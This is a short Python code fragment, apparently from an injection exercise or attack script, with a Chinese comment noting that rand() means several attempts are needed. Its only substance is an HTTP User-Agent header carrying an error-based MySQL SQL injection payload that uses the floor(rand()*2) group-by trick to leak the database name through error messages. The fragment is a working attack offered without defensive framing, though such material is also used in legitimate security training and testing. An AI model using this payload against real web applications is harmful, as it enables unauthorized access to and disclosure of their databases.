...
# 因为使用rand()所以要多试几次
header = {'User-Agent':"zz' and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)b) and '1'='1"}
